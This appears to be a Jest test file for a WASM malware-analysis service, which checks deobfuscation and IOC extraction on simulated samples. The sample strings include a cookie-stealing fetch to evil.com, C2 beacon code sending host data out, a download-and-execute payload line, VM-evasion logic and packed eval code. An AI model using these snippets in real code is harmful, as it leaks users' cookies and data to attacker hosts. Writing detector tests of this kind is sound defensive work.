import { describe, test, expect, beforeAll } from '@jest/globals';
import { analyzeWithWASM, getWASMStats } from '../../../Athena/services/analysisService';
import { readFileSync } from 'fs';
import { join } from 'path';

describe('End-to-End WASM Analysis Workflow', () => {
  beforeAll(async () => {
    // Ensure WASM modules are initialized
    await getWASMStats();
  });

  describe('Complete Malware Analysis Pipeline', () => {
    test('should analyze a simple JavaScript file', async () => {
      const jsCode = `
        function maliciousFunction() {
          eval(atob('YWxlcnQoIllvdSBoYXZlIGJlZW4gaGFja2VkISIp'));
          document.cookie = "stolen=" + document.cookie;
          fetch('http://evil.com/steal', { method: 'POST', body: document.cookie });
        }
      `;

      const result = await analyzeWithWASM(jsCode, 'malicious.js');

      expect(result).toBeDefined();
      expect(result.analysisReport).toContain('WASM Analysis Report');
      expect(result.analysisReport).toContain('File Processing');
      expect(result.analysisReport).toContain('Pattern Matching');
      expect(result.analysisReport).toContain('Deobfuscation Analysis');
      expect(result.vulnerabilities.length).toBeGreaterThan(0);
    }, 30000);

    test('should detect and deobfuscate Base64 encoded malware', async () => {
      // Base64 encoded PowerShell command
      const encodedMalware = 'UG93ZXJTaGVsbCAtRW5jb2RlZENvbW1hbmQgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggImNtZC5leGUiIC1Bcmd1bWVudExpc3QgIi9jIHBpbmcgZXZpbC5jb20i';
      
      const result = await analyzeWithWASM(encodedMalware, 'encoded.txt');

      expect(result.analysisReport).toContain('Obfuscation Detected: Yes');
      expect(result.analysisReport).toContain('Base64');
      expect(result.deobfuscatedCode).not.toBe(encodedMalware);
      expect(result.deobfuscatedCode).toContain('PowerShell');
    }, 30000);

    test('should handle multi-layer obfuscation', async () => {
      // Triple Base64 encoded "malware"
      let encoded = 'malware';
      for (let i = 0; i < 3; i++) {
        encoded = Buffer.from(encoded).toString('base64');
      }

      const result = await analyzeWithWASM(encoded, 'multilayer.txt');

      expect(result.analysisReport).toContain('Layers Processed');
      expect(result.deobfuscatedCode).toBe('malware');
    }, 30000);

    test('should extract IOCs from malicious content', async () => {
      const maliciousContent = `
        // Malicious script with various IOCs
        const c2Server = "http://192.168.1.100:8080/beacon";
        const backupC2 = "https://evil-domain.com/c2";
        const payload = "http://malware-host.net/payload.exe";
        
        function connect() {
          fetch(c2Server, {
            method: 'POST',
            body: JSON.stringify({
              hostname: window.location.hostname,
              userAgent: navigator.userAgent
            })
          });
        }
        
        // Download and execute payload
        downloadFile(payload, "C:\\\\Windows\\\\Temp\\\\update.exe");
      `;

      const result = await analyzeWithWASM(maliciousContent, 'ioc-sample.js');

      expect(result.analysisReport).toContain('Indicators of Compromise (IOCs)');
      expect(result.analysisReport).toContain('192.168.1.100');
      expect(result.analysisReport).toContain('evil-domain.com');
      expect(result.analysisReport).toContain('malware-host.net');
    }, 30000);

    test('should detect packed/obfuscated JavaScript', async () => {
      // Simulated packed JavaScript
      const packedJs = `
        eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('0.1("2 3!");',4,4,'console|log|Hello|World'.split('|'),0,{}))
      `;

      const result = await analyzeWithWASM(packedJs, 'packed.js');

      expect(result.analysisReport).toContain('JavaScript');
      expect(result.vulnerabilities.length).toBeGreaterThan(0);
    }, 30000);

    test('should analyze hex-encoded shellcode', async () => {
      // Simple hex-encoded content
      const hexShellcode = '\\x48\\x65\\x6c\\x6c\\x6f\\x20\\x57\\x6f\\x72\\x6c\\x64\\x21\\x0a\\x53\\x68\\x65\\x6c\\x6c\\x63\\x6f\\x64\\x65';

      const result = await analyzeWithWASM(hexShellcode, 'shellcode.bin');

      expect(result.analysisReport).toContain('Hex');
      expect(result.deobfuscatedCode).toContain('Hello World');
    }, 30000);

    test('should handle empty and invalid inputs gracefully', async () => {
      // Test empty input
      const emptyResult = await analyzeWithWASM('', 'empty.txt');
      expect(emptyResult).toBeDefined();
      expect(emptyResult.analysisReport).toContain('WASM Analysis Report');

      // Test invalid UTF-8
      const invalidResult = await analyzeWithWASM('\xFF\xFE\xFD', 'invalid.bin');
      expect(invalidResult).toBeDefined();
      expect(invalidResult.analysisReport).toContain('WASM Analysis Report');
    }, 30000);
  });

  describe('Performance Characteristics', () => {
    test('should handle large files efficiently', async () => {
      // Generate 5MB of test data
      const largeContent = 'A'.repeat(5 * 1024 * 1024);
      
      const startTime = Date.now();
      const result = await analyzeWithWASM(largeContent, 'large.txt');
      const analysisTime = Date.now() - startTime;

      expect(result).toBeDefined();
      expect(analysisTime).toBeLessThan(10000); // Should complete within 10 seconds
      console.log(`Large file (5MB) analysis completed in ${analysisTime}ms`);
    }, 30000);
  });

  describe('Module Statistics', () => {
    test('should retrieve module statistics', async () => {
      const stats = await getWASMStats();

      expect(stats.initialized).toBe(true);
      expect(stats.patternMatcherStats).toBeDefined();
      expect(stats.patternMatcherStats?.rulesLoaded).toBeGreaterThan(0);
      expect(stats.deobfuscatorConfig).toBeDefined();
      expect(stats.deobfuscatorConfig?.maxLayers).toBe(10);
    });
  });

  describe('Real-World Malware Samples', () => {
    test('should analyze a complex malware sample', async () => {
      // Simulated complex malware with multiple techniques
      const complexMalware = `
        // Stage 1: Environment detection
        var _0x5a1b=['location','hostname','userAgent','platform'];
        var isVM = navigator[_0x5a1b[2]].includes('VMware') || navigator[_0x5a1b[3]].includes('Virtual');
        
        // Stage 2: Obfuscated payload
        var payload = atob('ZnVuY3Rpb24gZXhlY3V0ZSgpIHsgZXZhbChhdG9iKCdZV3hsY25Rb0lsaGFja1ZFSWlrPScpKTsgfQ==');
        
        // Stage 3: C2 communication
        var c2 = String.fromCharCode(104,116,116,112,58,47,47) + atob('MTkyLjE2OC4xLjEwMA==') + ':' + (8080).toString();
        
        // Stage 4: Persistence mechanism
        if (!isVM) {
          eval(payload);
          fetch(c2 + '/beacon', {
            method: 'POST',
            body: JSON.stringify({
              h: window[_0x5a1b[0]][_0x5a1b[1]],
              u: navigator[_0x5a1b[2]],
              t: new Date().getTime()
            })
          });
        }
        
        // Stage 5: Additional obfuscation
        eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('1 0(){2.3("4 5!")}0();',6,6,'downloadPayload|function|console|log|Downloading|malware'.split('|')));
      `;

      const result = await analyzeWithWASM(complexMalware, 'complex-malware.js');

      expect(result.analysisReport).toContain('Obfuscation Detected: Yes');
      expect(result.analysisReport).toContain('JavaScript');
      expect(result.vulnerabilities.length).toBeGreaterThan(2); // Should detect multiple issues
      expect(result.analysisReport).toContain('192.168.1.100'); // Should extract C2 IP
    }, 30000);
  });
});